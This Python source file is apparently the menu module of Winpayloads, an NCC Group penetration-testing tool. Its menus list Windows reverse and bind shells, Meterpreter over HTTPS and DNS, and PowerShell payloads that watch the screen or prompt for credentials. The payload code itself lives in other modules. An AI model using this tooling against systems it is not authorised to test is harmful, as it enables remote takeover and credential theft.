from main import *
from payloadextras import *
from startmetasploit import *
from generatepayload import *
from preparepayload import *
from sockets import *
from help import *

def menuRaise():
    raise KeyboardInterrupt

def noColourLen(colourString):
    return len(re.compile(r'\x1b[^m]*m').sub('', colourString))

def noColourCenter(colourString):
    len = (t.width / 2) - (noColourLen(colourString) /2 )
    if len % 2 > 0:
        len -= 1
    return (' ' * len) + colourString

def getAndRunPSMenu():
    psMenu = MenuOptions(psMenuOptions)
    psMenu.runmenu()
    return False

def getAndRunClientMenu():
    clientMenu = MenuOptions(clientMenuOptions)
    clientMenu.runmenu()
    return False

def getAndRunMainMenu():
    mainMenu = MenuOptions(mainMenuOptions)
    mainMenu.runmenu()
    return False

mainMenuOptions = OrderedDict([
    ('1', {'payloadchoice': SHELLCODE.windows_rev_shell, 'payload': 'Windows_Reverse_Shell', 'extrawork': reversePayloadGeneration, 'availablemodules': None, 'params': None}),
    ('2', {'payloadchoice': SHELLCODE.windows_met_rev_shell, 'payload': 'Windows_Meterpreter_Reverse_Shell', 'extrawork': reversePayloadGeneration, 'availablemodules': METASPLOIT_Functions['reverse'], 'params': None}),
    ('3', {'payloadchoice': SHELLCODE.windows_met_bind_shell, 'payload': 'Windows_Meterpreter_Bind_Shell', 'extrawork': bindPayloadGeneration, 'availablemodules': METASPLOIT_Functions['bind'], 'params': None}),
    ('4', {'payloadchoice': SHELLCODE.windows_met_rev_https_shell, 'payload': 'Windows_Meterpreter_Reverse_HTTPS', 'extrawork': httpsPayloadGeneration, 'availablemodules': METASPLOIT_Functions['https'], 'params': None}),
    ('5', {'payloadchoice': SHELLCODE.windows_met_rev_shell_dns, 'payload': 'Windows_Meterpreter_Reverse_Dns', 'extrawork': dnsPayloadGeneration, 'availablemodules': METASPLOIT_Functions['dns'], 'params': None}),
    ('ps', {'payloadchoice': None, 'payload': 'PowerShell Menu', 'extrawork': getAndRunPSMenu, 'params': None}),
    ('stager', {'payloadchoice': None, 'payload': 'Powershell Interpreter Stager', 'extrawork': printListener, 'params': None}),
    ('clients', {'payloadchoice': None, 'payload': 'Connected Interpreter Clients', 'extrawork': getAndRunClientMenu, 'params': None, 'spacer': True}),
    ('?', {'payloadchoice': None, 'payload': 'Print Detailed Help', 'extrawork': winpayloads_help, 'params': None}),
    ('back', {'payloadchoice': None, 'payload': 'Main Menu', 'extrawork': getAndRunMainMenu, 'params': None}),
    ('exit', {'payloadchoice': None, 'payload': 'Exit', 'extrawork': menuRaise, 'params': None}),
])

psMenuOptions = OrderedDict([
    ('1', {'payloadchoice': SHELLCODE.windows_ps_rev_shell, 'payload': 'Windows_Interactive_Reverse_Powershell_Shell', 'extrawork': reversePowerShellGeneration, 'params': None}),
    ('2', {'payloadchoice': SHELLCODE.windows_ps_rev_watch_screen, 'payload': 'Windows_Reverse_Powershell_ScreenWatch', 'extrawork': reversePowerShellWatchScreenGeneration, 'params': None}),
    ('3', {'payloadchoice': SHELLCODE.windows_ps_ask_creds_tcp, 'payload': 'Windows_Reverse_Powershell_Asks_Creds', 'extrawork': reversePowerShellAskCredsGeneration, 'params': None}),
    ('clients', {'payloadchoice': None, 'payload': 'Connected Interpreter Clients', 'extrawork': getAndRunClientMenu, 'params': None}),
    ('back', {'payloadchoice': None, 'payload': 'Main Menu', 'extrawork': getAndRunMainMenu, 'params': None}),
])

clientMenuOptions = OrderedDict([
    ('back', {'payloadchoice': None, 'payload': 'Main Menu', 'extrawork': getAndRunMainMenu, 'params': None}),
    ('r', {'payloadchoice': None, 'payload': 'Refresh', 'extrawork': getAndRunClientMenu, 'params': None}),
])


class MenuOptions(object):
    def __init__(self, choices):
        self.choices = choices

    def _choose(self, n):
        if self.choices.has_key(n):
            return (True, self.choices[n]['payloadchoice'], self.choices[n]['payload'], self.choices[n]['extrawork'], self.choices[n]['params'])
        else:
            print t.bold_red + '[*] Wrong Selection' + t.normal
            return (False, None, None, None, None)

    def runmenu(self):
        self.printMenues()
        while True:
            user_choice = raw_input('>')
            success, payloadchoice, payload, extrawork, params = self._choose(user_choice)

            if not success:
                continue
            if extrawork:
                if payloadchoice:
                    result = extrawork(payloadchoice,payload)
                elif params:
                    result = extrawork(*params)
                else:
                    result = extrawork()
                if result == True:
                    pass
                if result == False:
                    break

    def printMenues(self):
        Splash()
        if t.width % 2 > 0:
            adjust = 1
        else:
            adjust = 0
        print '=' * (t.width / 2 - 3) + "-MENU-" + '=' * (t.width / 2 - (3 - adjust))
        maxlen = 0
        arr = []
        for i in self.choices.iterkeys():
            menuPrintString = t.bold_yellow + str(i) + ': ' + t.normal + str(self.choices[i]['payload']).replace('_',' ')
            if 'availablemodules' in self.choices[i].keys() and self.choices[i]['availablemodules']:
                menuPrintString += t.bold_green + ' ' + str(self.choices[i]['availablemodules'].keys()).replace('\'','').replace('normal, ','') + t.normal
            if 'spacer' in self.choices[i]:
                menuPrintString += '\n'

            nocolourlen = noColourLen(menuPrintString)
            if nocolourlen > maxlen:
                maxlen = nocolourlen
            arr.append(menuPrintString)

        for i in arr:
            spacing = (t.width / 2) - (maxlen / 2)
            if spacing % 2 > 0:
                spacing -= 1
            if len(i) % 2 > 0:
                adjust = 0
            else:
                adjust = 1
            print (' '* spacing) + i + (' ' * (spacing - adjust))
        print '='*t.width

def Splash():
    print t.clear + t.bold_red
    print noColourCenter("_       ___       ____              __                __")
    print noColourCenter("   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____")
    print noColourCenter("   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/")
    print noColourCenter(" | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )")
    print noColourCenter(" |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/")
    print noColourCenter("                        /____/NCCGroup - CharlieDean" + t.normal)
